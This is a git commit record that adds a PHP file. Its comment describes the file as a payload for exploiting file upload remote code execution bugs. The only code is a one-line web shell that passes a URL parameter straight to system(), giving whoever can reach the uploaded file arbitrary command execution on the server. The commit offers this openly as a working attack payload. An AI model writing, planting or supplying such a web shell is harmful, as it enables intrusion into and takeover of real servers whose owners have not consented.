1eea273397ae46f12ab88aa5537ceeb306b2f38a
Malek Abu liala <64085566+malekAbuliala@users.noreply.github.com>
2026-01-20 13:48:14 +0300

    Create code_file_upload_rce_type_lapx.php

---
+++ code_file_upload_rce_type_lapx.php
@@ -0,0 +1,3 @@
+# This codeing we will using with File Upload RCE Bug type and This file expresses the exploited File Upload RCE if server using php lang ( The section follows the RCE Bug )
+
+<?php echo system($_GET['cmd']); ?>
